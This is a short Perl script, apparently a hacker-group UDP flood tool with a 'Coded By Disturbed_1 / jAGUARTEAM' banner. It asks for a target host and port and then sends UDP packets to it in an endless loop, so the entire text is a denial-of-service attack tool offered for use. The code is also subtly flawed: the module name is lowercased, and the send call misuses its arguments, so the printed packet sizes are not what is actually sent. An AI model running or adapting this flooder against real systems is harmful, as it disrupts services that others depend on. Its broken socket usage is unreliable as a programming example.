#!/usr/bin/perl
# udp
#flooder.pl coded by disturbed_1

print q{
=================================================
= =
= Coded By =
= =
= Disturbed_1 =
= =
= jAGUARTEAM =
= =
= =
= =
=================================================
};

use io::socket;

print "Host: ";
chop ($host = <stdin>);
print "Port: ";
chop ($port = <stdin>);

{
$sock = IO::Socket::INET->new (
PeerAddr => $host,
PeerPort => $port,
Proto => 'udp') || die "$! Make sure the IP/host or port number is correct";
}
packets:
while (1) {
$size = rand() * 200 * 2000;
print ("$host:$port packet size: $size\n");
send($sock, 0, $size);
}
